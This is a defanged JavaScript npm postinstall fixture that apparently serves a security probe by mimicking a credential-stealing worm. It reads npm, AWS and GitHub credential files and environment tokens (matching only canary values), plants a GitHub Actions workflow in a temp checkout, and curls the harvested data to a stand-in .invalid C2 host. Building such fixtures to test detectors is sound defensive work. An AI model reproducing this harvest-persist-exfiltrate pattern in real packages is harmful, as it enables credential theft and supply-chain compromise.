// BENIGN SYNTHETIC FIXTURE - the FLAWED twin.
//
// It reproduces the SHAPE of the Shai-Hulud / CHAINDROP npm worm's install
// stage (Sep 2025, and the "Second Coming" wave of Nov 2025) with none of its
// substance. Three steps, in the order the real thing does them:
//
//   1. harvest  read the developer's credential FILES - the npm registry
//               token, the AWS key, the gh CLI's OAuth token - plus the same
//               three secrets from the environment, as a CI runner would hold
//               them.
//   2. persist  write a GitHub Actions WORKFLOW into the checkout, so CI
//               re-exfiltrates on every future push using an identity CI is
//               supposed to have. This is the propagation engine, and it is
//               the observable a "does a postinstall run?" check cannot see.
//   3. beacon   send the harvested value to a C2 host.
//
// Every part of it is defanged. The only credentials it can find are the
// random canary nonces the probe planted - there is nothing real on the disk
// it is handed. The workflow it writes is a no-op `echo` in the probe's own
// throwaway checkout, which is deleted when the probe exits. The C2 host is
// under .invalid (RFC 2606), which no resolver will ever answer, so outside
// the probe's loopback proxy this beacon cannot leave the machine at all.
'use strict';

const fs = require('fs');
const os = require('os');
const path = require('path');
const { execFileSync } = require('child_process');

const CANARY = /CXGCANARY[0-9A-Z]+/;
const home = os.homedir();

// --- 1. harvest ------------------------------------------------------------
const loot = [];
for (const rel of ['.npmrc', '.aws/credentials', '.config/gh/hosts.yml']) {
  try {
    const hit = fs.readFileSync(path.join(home, rel), 'utf8').match(CANARY);
    if (hit) loot.push(rel + '=' + hit[0]);
  } catch (e) { /* not present in this environment */ }
}
for (const name of ['NPM_TOKEN', 'AWS_SECRET_ACCESS_KEY', 'GH_TOKEN']) {
  const value = process.env[name];
  if (value && CANARY.test(value)) loot.push(name + '=' + value);
}
const blob = loot.join(';') || 'none';

// --- 2. persist: plant a workflow in the checkout ---------------------------
// npm sets INIT_CWD to the directory `npm install` was invoked from, which is
// the developer's repository - not this package's own tree.
const repo = process.env.INIT_CWD || process.cwd();
// SAFETY GUARD, not part of the shape being reproduced: this fixture refuses
// to write anywhere but a temporary directory. Run outside the probe's lab -
// by a curious reader, or by a test runner pointed at the wrong path - it
// plants nothing rather than touching a real repository.
const underTmp = (p) => {
  try {
    return fs.realpathSync(p).startsWith(fs.realpathSync(os.tmpdir()) + path.sep);
  } catch (e) { return false; }
};
try {
  if (!underTmp(repo)) throw new Error('refusing to plant outside a temp dir');
  const dir = path.join(repo, '.github', 'workflows');
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, 'cxg-fixture-shai-hulud.yml'),
    [
      '# BENIGN SYNTHETIC FIXTURE - planted by a cxg test fixture.',
      '# A real worm puts its exfiltration here. This one echoes.',
      'name: cxg-fixture-planted',
      'on: [push]',
      'jobs:',
      '  collect:',
      '    runs-on: ubuntu-latest',
      '    steps:',
      '      - run: echo ' + JSON.stringify(blob),
      '',
    ].join('\n'));
} catch (e) { /* ignore */ }

// --- 3. beacon -------------------------------------------------------------
try {
  execFileSync('curl', [
    '-s', '--max-time', '5', '-o', '/dev/null',
    'http://cxg-fixture-c2.invalid/collect?d=' + encodeURIComponent(blob),
  ], { stdio: 'ignore' });
} catch (e) { /* no route, no proxy: the beacon simply fails */ }

console.log('cxg-fixture-credaccess-flawed: postinstall complete');
